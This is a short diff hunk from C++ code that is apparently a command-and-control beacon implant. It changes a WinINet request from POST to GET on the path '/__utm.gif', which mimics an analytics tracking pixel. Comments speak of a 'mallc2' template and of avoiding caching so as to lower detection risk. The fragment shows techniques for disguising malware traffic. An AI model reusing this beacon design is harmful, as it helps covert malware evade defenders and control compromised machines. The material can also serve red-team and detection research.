@@ -108,7 +108,7 @@ bool HTTP_POST(std::string data, std::vector<std::wstring>& headers, std::vector
     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequestw
     HINTERNET hRequest = HttpOpenRequestW(
         hConnect,
-        L"POST",                // Method - template, mallc2 this
+        L"GET",                // Method - template, mallc2 this
         L"/__utm.gif",          // Path - template, mallc2 this
         NULL, NULL, NULL,
         INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, ///reload: always gets new, no cache, doesn't cache. cache = bad cuz the data is somewhere else besides beacon. Increases detection likelyhood + potential repeat commands
